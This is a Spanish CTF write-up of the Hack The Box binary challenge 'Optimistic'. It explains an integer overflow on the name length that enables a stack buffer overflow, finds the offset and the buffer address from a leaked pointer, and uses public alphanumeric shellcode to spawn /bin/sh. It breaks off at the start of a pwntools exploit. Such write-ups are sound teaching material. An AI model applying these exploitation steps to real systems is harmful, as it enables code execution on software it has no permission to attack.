<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Optimistic - Pwn Challenge (HTB) ❤" /><meta name="author" content="sha16" /><meta property="og:locale" content="es" /><meta name="description" content="Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation." /><meta property="og:description" content="Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation." /><link rel="canonical" href="https://sha-16.github.io/posts/Optimistic-HackTheBox-Pwn/" /><meta property="og:url" content="https://sha-16.github.io/posts/Optimistic-HackTheBox-Pwn/" /><meta property="og:site_name" content="sha16" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-09-17T00:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Optimistic - Pwn Challenge (HTB) ❤" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"sha16"},"description":"Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.","url":"https://sha-16.github.io/posts/Optimistic-HackTheBox-Pwn/","@type":"BlogPosting","headline":"Optimistic - Pwn Challenge (HTB) ❤","dateModified":"2023-09-27T22:48:54-03:00","datePublished":"2023-09-17T00:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://sha-16.github.io/posts/Optimistic-HackTheBox-Pwn/"},"@context":"https://schema.org"}</script><title>Optimistic - Pwn Challenge (HTB) ❤ | sha16</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="sha16"><meta name="application-name" content="sha16"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sha-16.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">sha16</a></div><div class="site-subtitle font-italic">❤ Pentester / Red Team</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/sha-16" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" aria-label="twitch" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-twitch"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Optimistic - Pwn Challenge (HTB) ❤</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Optimistic - Pwn Challenge (HTB) ❤</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> sha16 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 17, 2023, 12:00 AM -0300" >Sep 17<i class="unloaded">2023-09-17T00:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Sep 27, 2023, 10:48 PM -0300" >Sep 27<i class="unloaded">2023-09-27T22:48:54-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1572 words">8 min read</span></div></div><div class="post-content"><p>Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation.</p><p>En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que simplemente te solicita datos “personales”:</p><ul><li>Correo<li>Edad<li>N° de caracteres que tendrá el nombre<li>Nombre</ul><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled.png" alt="Untitled" /></p><p>Como se visualiza en imagen, el programa te exfiltra directamente una dirección de memoria, la cual por ahora desconocemos.</p><p>Para empezar, es importante chequear si es que el programa cuenta con algún tipo de protección jodida de evadir:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%201.png" alt="Untitled" /></p><p>Como se puede ver no existen protecciones importantes que nos hiciesen imposible el camino de explotación.</p><p>Por lo tanto, lo primero que hacemos es reversear el código con Ghidra:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">checker_length</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">user_input</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">length_user_name</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">user_age</span><span class="p">;</span>
  <span class="n">undefined2</span> <span class="n">user_email</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">user_option</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">no_option</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">user_input_email</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">undefined</span> <span class="n">user_input_age</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">user_input_name</span> <span class="p">[</span><span class="mi">96</span><span class="p">];</span>
  
  <span class="n">initialize</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to the positive community!"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"We help you embrace optimism."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Would you like to enroll yourself? (y/n): "</span><span class="p">);</span>
  <span class="n">checker_length</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
  <span class="n">user_option</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">checker_length</span><span class="p">;</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">user_option</span> <span class="o">!=</span> <span class="sc">'y'</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Too bad, see you next time :("</span><span class="p">);</span>
    <span class="n">no_option</span> <span class="o">=</span> <span class="sc">'n'</span><span class="p">;</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Great! Here</span><span class="se">\'</span><span class="s">s a small welcome gift: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0xfffffffffffffff8</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Please provide your details."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Email: "</span><span class="p">);</span>
  <span class="n">user_input</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">user_input_email</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
  <span class="n">user_email</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span><span class="p">)</span><span class="n">user_input</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Age: "</span><span class="p">);</span>
  <span class="n">user_input</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">user_input_age</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
  <span class="n">user_age</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span><span class="p">)</span><span class="n">user_input</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Length of name: "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102104</span><span class="p">,</span><span class="o">&amp;</span><span class="n">length_user_name</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="mi">64</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Woah there! You shouldn</span><span class="se">\'</span><span class="s">t be too optimistic."</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">);</span>
  <span class="n">user_input</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">user_input_name</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">);</span>
  <span class="n">length_user_name</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">user_input</span> <span class="o">+</span> <span class="o">-</span><span class="mi">9</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you! We</span><span class="se">\'</span><span class="s">ll be in touch soon."</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">checker_length</span> <span class="o">=</span> <span class="n">isalpha</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">user_input_name</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">checker_length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="mi">9</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">user_input_name</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x30U</span><span class="p">))</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">length_user_name</span> <span class="o">=</span> <span class="n">length_user_name</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Sorry, that</span><span class="se">\'</span><span class="s">s an invalid name."</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Como se puede ver en el siguiente fragmento de código el programa solicita el tamaño en bytes que va a tener el nombre del usuario. Es curioso mencionar que la única validación que se efectúa, en este aspecto, es que el número ingresado no sea mayor a <code class="language-plaintext highlighter-rouge">64</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"Length of name: "</span><span class="p">);</span>
<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102104</span><span class="p">,</span><span class="o">&amp;</span><span class="n">length_user_name</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="mi">64</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Woah there! You shouldn</span><span class="se">\'</span><span class="s">t be too optimistic."</span><span class="p">);</span>
                  <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>El nombre del usuario tiene reservado <code class="language-plaintext highlighter-rouge">96 bytes</code> por lo que, en primera instancia, no podríamos generar un length mayor que nos permitiese desbordar el buffer.</p><p>Otro punto importante a considerar, es que cuando el nombre del usuario es solicitado, el length de este se formatea de <em>Integer</em> a <em>Unsigned Long</em>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">);</span>
<span class="n">user_input</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">user_input_name</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">);</span>
</pre></table></code></div></div><p>Considerando los dos puntos mencionados anteriormente, la conclusión es que podemos explotar un <em>Integer Overflow</em>:</p><ul><li>Se puede introducir un dato <em>Integer</em> menor a 0.<li>El dato <em>Integer</em> se formatea a <em>Unsigned Long</em>.</ul><p>Para dar más contexto, los lenguajes de programación permiten definir datos de tipo <em>Integers</em>. Este tipo de datos tienen un límite numérico (tanto superior como inferior), el cual, si llega a ser sobrepasado, provocará que el programa entregue un resultado con un valor erróneo. Por ejemplo, en lenguaje <strong>C</strong>: el número <em>Integer</em> límite es <code class="language-plaintext highlighter-rouge">2147483647</code>. Si nosotros tratamos de hacer un <code class="language-plaintext highlighter-rouge">print</code> de <code class="language-plaintext highlighter-rouge">2147483648</code>, el programa entregará <code class="language-plaintext highlighter-rouge">-2147483648</code>, lo cual es erróneo debido a que se ha generado un <em>overflow</em> del entero.</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%202.png" alt="Untitled" /></p><p>Otro punto a considerar es que, si nosotros formateamos un <em>Integer</em> con valor negativo, como <code class="language-plaintext highlighter-rouge">-1</code> a <em>Unsigned Long</em>, este cambiará su valor al límite superior de datos <em>Unsigned Long,</em> que corresponde a <code class="language-plaintext highlighter-rouge">18446744073709551615 (0xffffffffffffffff)</code>. Esto ocurre porque los valores <em>Unsigned</em> siempre van del <code class="language-plaintext highlighter-rouge">0</code> en adelante (hasta su respectivo límite).</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%203.png" alt="Untitled" /></p><p>Aplicando esta misma lógica en el reto, podríamos introducir un número <code class="language-plaintext highlighter-rouge">-1</code> en el <em>length</em> del nombre, y de esta manera indicarle a la función <code class="language-plaintext highlighter-rouge">read</code> que asigne más de <code class="language-plaintext highlighter-rouge">64 bytes</code> para el valor a almacenar en la variable <code class="language-plaintext highlighter-rouge">user_input_name</code>. De esta forma, aprovechamos la conversión a <code class="language-plaintext highlighter-rouge">ulong</code> que se ejecuta dentro de la función <code class="language-plaintext highlighter-rouge">read</code>.</p><p>Como se puede ver a continuación, el programa acepta correctamente el <em>length</em> <code class="language-plaintext highlighter-rouge">-1</code>. Por lo tanto, hecho esto, se introduce una cadena de <code class="language-plaintext highlighter-rouge">150 bytes</code>, superior al espacio asignado para la variable <code class="language-plaintext highlighter-rouge">user_input_name</code>, lo que causa que el programa arroje un error <code class="language-plaintext highlighter-rouge">Segmentation fault</code> por desbordamiento de buffer.</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%204.png" alt="Untitled" /></p><p>Ahora, por ejemplo, si metemos <code class="language-plaintext highlighter-rouge">2147483648</code> en el <em>length</em> del nombre, también estaríamos explotando el desbordamiento de enteros, lo cual de igual forma nos permitirá desbordar el buffer del programa, ya que el espacio asignado en la función <code class="language-plaintext highlighter-rouge">read</code> será mayor al espacio reservado para la variable de <code class="language-plaintext highlighter-rouge">96 bytes</code> donde se almacena el nombre del usuario.</p><p>En la siguiente imagen, se puede ver que se ingresa el número <code class="language-plaintext highlighter-rouge">2147483648</code> en el <em>length</em> del nombre. Es importante recordarles que, por el <em>Integer Overflow</em>, este se almacenará como <code class="language-plaintext highlighter-rouge">-2147483648</code>, el cual posteriormente al ser convertido a <em>Unsigned Long</em> dará como resultado un número “erróneo” mucho mayor a <code class="language-plaintext highlighter-rouge">0</code> y a <code class="language-plaintext highlighter-rouge">96</code>.</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%205.png" alt="Untitled" /></p><p>Habiendo identificado la existencia del BoF, podemos proceder a debuggear el programa con la herramienta <code class="language-plaintext highlighter-rouge">gdb-gef</code>.</p><p>Primeramente, tenemos que tratar de identificar el <code class="language-plaintext highlighter-rouge">offset</code>, por lo que utilizamos <code class="language-plaintext highlighter-rouge">pattern create</code> para generar una cadena de <code class="language-plaintext highlighter-rouge">150 bytes</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%206.png" alt="Untitled" /></p><p>Posterior a esto arrancamos el programa, explotamos el <em>Integer Overflow</em> y colocamos nuestra cadena de <code class="language-plaintext highlighter-rouge">150 bytes</code> para desbordar el buffer y encontrar el <code class="language-plaintext highlighter-rouge">offset</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%207.png" alt="Untitled" /></p><p>Como se logra ver en la imagen, el <code class="language-plaintext highlighter-rouge">offset</code> corresponde a <code class="language-plaintext highlighter-rouge">104 bytes</code>.</p><p>Antes de inyectar nuestro payload final, con el <code class="language-plaintext highlighter-rouge">shellcode</code> y todo, tenemos que saber la distancia que existe entre la dirección de memoria que se likea con la dirección de memoria de la variable que almacena el nombre ingresado.</p><p>Este es un paso necesario, ya que necesitamos que la dirección de memoria que ingresemos en el payload apunte hacía la dirección de memoria donde se encuentre cargado nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, la cual corresponde justamente a la de la variable que almacena el nombre ingresado.</p><p>Para esto, inyectaremos la siguiente cadena, la cual nos permitirá localizar la dirección de memoria, dependiendo de donde se encuentre la coincidencia <code class="language-plaintext highlighter-rouge">AAAAAAAA</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</pre></table></code></div></div><p>Como se muestra en imagen, la coincidencia es identificada con éxito en la dirección <code class="language-plaintext highlighter-rouge">0x7fffffffe110</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%208.png" alt="Untitled" /></p><p>De esta manera, restando la dirección de memoria likeada (<code class="language-plaintext highlighter-rouge">0x7fffffffe170</code>) con la identificada a partir de la cadena <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> (<code class="language-plaintext highlighter-rouge">0x7fffffffe110</code>), podremos saber la localización específica de la variable <code class="language-plaintext highlighter-rouge">user_input_name</code>, en la memoria:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%209.png" alt="Untitled" /></p><p>Como se puede ver, el resultado indica que la dirección de memoria de la variable <code class="language-plaintext highlighter-rouge">user_input_name</code> se encuentra a <code class="language-plaintext highlighter-rouge">96 bytes</code> de la dirección de memoria likeada, lo cual se traduce en <code class="language-plaintext highlighter-rouge">0x7fffffffe170 - 0x60</code>:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%2010.png" alt="Untitled" /></p><p>Antes de finalizar, existe un pequeño problema, debido a que el código que inyectemos pasará por medio de la siguiente condicional, la cual se encarga de validar que todos los caracteres introducidos en el <code class="language-plaintext highlighter-rouge">user_input_name</code> sean alfanuméricos.</p><p>Si metemos un <code class="language-plaintext highlighter-rouge">shellcode</code> común y corriente, computado con <code class="language-plaintext highlighter-rouge">MSFvenom</code>, el programa nos arrojará el error <code class="language-plaintext highlighter-rouge">Sorry, that's an invalid name</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">checker_length</span> <span class="o">=</span> <span class="n">isalpha</span><span class="p">((</span><span class="nb">int</span><span class="p">)</span><span class="n">user_input_name</span><span class="p">[(</span><span class="nb">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">((</span><span class="n">checker_length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="mi">9</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="n">user_input_name</span><span class="p">[(</span><span class="nb">int</span><span class="p">)</span><span class="n">length_user_name</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x30</span><span class="n">U</span><span class="p">))</span> <span class="k">break</span><span class="p">;</span>
	<span class="n">length_user_name</span> <span class="o">=</span> <span class="n">length_user_name</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</pre></table></code></div></div><p>Dado esto, utilizamos el siguiente <code class="language-plaintext highlighter-rouge">shellcode</code>, público en <a href="https://www.exploit-db.com/exploits/35205">ExploitDB</a>, el cual es completamente alfanumérico y permite ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, de manera directa:</p><p><img data-proofer-ignore data-src="/assets/img/htb/pwn/Optimistic/Untitled%2011.png" alt="Untitled" /></p><p>Teniendo esto en consideración, desarrollamos el siguiente exploit, el cual nos permite explotar binario de forma local con éxito:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">log</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="sa">b</span><span class="s">'./optimistic'</span><span class="p">)</span>
